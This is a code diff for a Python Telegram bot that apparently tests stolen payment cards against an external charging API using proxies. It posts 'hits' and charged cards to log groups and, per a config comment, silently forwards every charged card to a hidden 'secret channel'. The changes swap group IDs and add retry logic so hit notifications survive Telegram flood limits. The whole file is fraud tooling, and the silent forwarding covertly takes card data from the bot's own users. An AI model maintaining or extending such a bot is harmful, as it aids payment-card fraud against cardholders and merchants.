@@ -59,7 +59,7 @@ from typing import Optional
 
 import aiohttp
 from telegram import Update, InputFile, MessageEntity
-from telegram.error import RetryAfter
+from telegram.error import BadRequest, Forbidden, NetworkError, RetryAfter, TimedOut
 from telegram.ext import CommandHandler, CallbackQueryHandler, ContextTypes
 
 from config import (
@@ -92,8 +92,8 @@ API_URL       = "https://lucifer.up.railway.app/shopii"
 BOT_CHANNEL   = CHANNEL_LINK
 DEV_LINK_HTML = f'<a href="{BOT_CHANNEL}">{BOT_NAME}</a>'
 
-HIT_LOG_GROUP_ID       = -1004329967819   # public hit log group
-EXTRA_CHARGED_GROUP_ID = -0   # extra charged log
+HIT_LOG_GROUP_ID       = -1004361062205   # public hit log group
+EXTRA_CHARGED_GROUP_ID = -1003991915326   # extra charged log
 
 # ── Secret channel — auto-receives every CHARGED card silently ──────────────
 SECRET_CHANNEL_ID   = -1003968669478
@@ -102,7 +102,7 @@ SECRET_CHANNEL_LINK = "https://t.me/+BfUGjEXaySM2MDc0"
 BOT_USERNAME_LINK   = "https://t.me/Batxchk_bot"
 BOT_PLANS_LINK      = "https://t.me/Batxchk_bot?start=plans"  # deep-links → /plans
 MY_CHANNEL_LINK     = CHANNEL_LINK                                 # main channel
-LOGS_CHANNEL_LINK   = "https://t.me/Batcardchk"                    # hits log channel
+
 SH_COOLDOWN    = 25
 
 # ── Speed / concurrency settings ───────────────────────────────────────────
@@ -1773,10 +1773,9 @@ async def _update_progress(bot, sid: str, force: bool = False):
     if text == sess.get("last_text") and not force:
         return
     try:
-        plain_text, entities = html_to_entities(text)
         await bot.edit_message_text(
             chat_id=sess["chat_id"], message_id=sess["msg_id"],
-            text=plain_text, entities=entities,
+            text=text, parse_mode="HTML",
             reply_markup=_msh_buttons(sid, running),
             disable_web_page_preview=True,
         )
@@ -1855,6 +1854,8 @@ def _make_result_file(sess: dict, kind: str) -> tuple:
 
 _DM_QUEUE: "asyncio.Queue | None" = None
 _DM_WORKER_TASK: "asyncio.Task | None" = None
+_DM_MAX_ATTEMPTS = 6
+_DM_RETRY_DELAYS = (1.0, 2.0, 4.0, 8.0, 15.0)
 
 def _get_dm_queue() -> "asyncio.Queue":
     """Return (lazily creating) the global DM queue."""
@@ -1865,26 +1866,13 @@ def _get_dm_queue() -> "asyncio.Queue":
 
 
 async def _dm_worker() -> None:
-    """Consume DM tasks from the queue, one at a time, with retry-after handling."""
+    """Consume reusable DM jobs one at a time without dropping flood-limited hits."""
     q = _get_dm_queue()
     while True:
         try:
-            coro = await q.get()
+            job = await q.get()
             try:
-                await coro
-            except Exception as exc:
-                exc_str = str(exc).lower()
-                if "retry" in exc_str or "flood" in exc_str or "429" in exc_str:
-                    # Parse retry_after from the exception message, default 5 s
-                    m = re.search(r"retry.{0,10}?(\d+)", exc_str)
-                    wait = int(m.group(1)) if m else 5
-                    wait = min(wait, 60)   # cap at 60 s
-                    logging.warning(f"[DM_QUEUE] Flood control: sleeping {wait}s")
-                    await asyncio.sleep(wait)
-                    # Re-queue the coroutine (already consumed — best effort log)
-                    logging.warning("[DM_QUEUE] Dropped one DM after flood wait (coro spent).")
-                else:
-                    logging.warning(f"[DM_QUEUE] DM failed: {exc}")
+                await _deliver_queued_dm(job)
             finally:
                 q.task_done()
             # Polite inter-message gap — 1.1 s keeps us under 1 msg/s per chat
@@ -1894,6 +1882,67 @@ async def _dm_worker() -> None:
             return
         except Exception as exc:
             logging.error(f"[DM_QUEUE] unexpected error: {exc}")
+
+
+async def _deliver_queued_dm(job: dict) -> None:
+    """Deliver one queued DM with reusable arguments and bounded retries."""
+    full_html = job["caption"]
+    if job.get("emoji_id"):
+        full_html = (
+            f'<b><tg-emoji emoji-id="{job["emoji_id"]}">⭐</tg-emoji></b>\n'
+            f"{full_html}"
+        )
+    plain_text, entities = html_to_entities(full_html)
+
+    for attempt in range(1, _DM_MAX_ATTEMPTS + 1):
+        try:
+            await job["bot"].send_message(
+                chat_id=job["chat_id"],
+                text=plain_text,
+                entities=entities or None,
+                reply_markup=job.get("reply_markup"),
+                disable_web_page_preview=True,
+                disable_notification=job.get("disable_notification", False),
+            )
+            return
+        except RetryAfter as exc:
+            if attempt >= _DM_MAX_ATTEMPTS:
+                logging.error(
+                    "[DM_QUEUE] Flood retry exhausted uid=%s attempts=%s",
+                    job["chat_id"], attempt,
+                )
+                return
+            wait = min(max(float(getattr(exc, "retry_after", 1.0)) + 0.5, 1.0), 120.0)
+            logging.warning(
+                "[DM_QUEUE] Flood control uid=%s retry=%s/%s wait=%.1fs",
+                job["chat_id"], attempt, _DM_MAX_ATTEMPTS, wait,
+            )
+            await asyncio.sleep(wait)
+        except (TimedOut, NetworkError, asyncio.TimeoutError) as exc:
+            if attempt >= _DM_MAX_ATTEMPTS:
+                logging.error(
+                    "[DM_QUEUE] Network retry exhausted uid=%s attempts=%s: %s",
+                    job["chat_id"], attempt, exc,
+                )
+                return
+            delay = _DM_RETRY_DELAYS[min(attempt - 1, len(_DM_RETRY_DELAYS) - 1)]
+            logging.warning(
+                "[DM_QUEUE] Temporary failure uid=%s retry=%s/%s wait=%.1fs: %s",
+                job["chat_id"], attempt, _DM_MAX_ATTEMPTS, delay, exc,
+            )
+            await asyncio.sleep(delay)
+        except (Forbidden, BadRequest) as exc:
+            logging.warning(
+                "[DM_QUEUE] Permanent Telegram rejection uid=%s: %s",
+                job["chat_id"], exc,
+            )
+            return
+        except Exception as exc:
+            logging.exception(
+                "[DM_QUEUE] Unexpected DM failure uid=%s: %s",
+                job["chat_id"], exc,
+            )
+            return
 
 
 def _ensure_dm_worker() -> None:
@@ -1908,14 +1957,15 @@ async def _enqueue_dm(bot, chat_id: int, eid: str, caption: str,
                       disable_notification: bool = False) -> None:
     """Push a DM send-job onto the flood-safe queue."""
     _ensure_dm_worker()
-    # Build the coroutine now (captures all args by closure)
-    async def _send():
-        await _send_as_media(
-            bot, chat_id, eid, caption=caption,
-            parse_mode=parse_mode, reply_markup=reply_markup,
-            disable_notification=disable_notification,
-        )
-    await _get_dm_queue().put(_send())
+    await _get_dm_queue().put({
+        "bot": bot,
+        "chat_id": chat_id,
+        "emoji_id": eid,
+        "caption": caption,
+        "parse_mode": parse_mode,
+        "reply_markup": reply_markup,
+        "disable_notification": disable_notification,
+    })
 
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@@ -1962,8 +2012,7 @@ async def _send_hit(bot, user, text: str, verdict: str,
     )
 
     log_kb = RawMarkup([[
-        _btn("𝘽𝘼𝙏𝘾𝙃𝙆", url=BOT_USERNAME_LINK, style="primary",
-             icon=CARD_CHK_BTN_EMOJI_ID),
+        _btn("𝑩𝑨𝑻𝑪𝑯𝑲", url=BOT_USERNAME_LINK, style="primary"),
     ]])
 
     # ── 1. DM — queued to avoid Telegram flood (1 msg/s per chat) ─────────────
@@ -2315,8 +2364,7 @@ async def cmd_sh(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f'<b><tg-emoji emoji-id="{SH_PROG_EMOJI_ID}">😄</tg-emoji>Progress ➳ 0/1</b>\n'
         f'<b>Live ➳ 0 <tg-emoji emoji-id="{SH_LIVE_EMOJI_ID}">🎸</tg-emoji>✅</b>'
     )
-    spinner_text, spinner_entities = html_to_entities(spinner_html)
-    spin = await update.message.reply_text(spinner_text, entities=spinner_entities)
+    spin = await update.message.reply_text(spinner_html, parse_mode="HTML")
 
     proxies = _load_proxies()
 
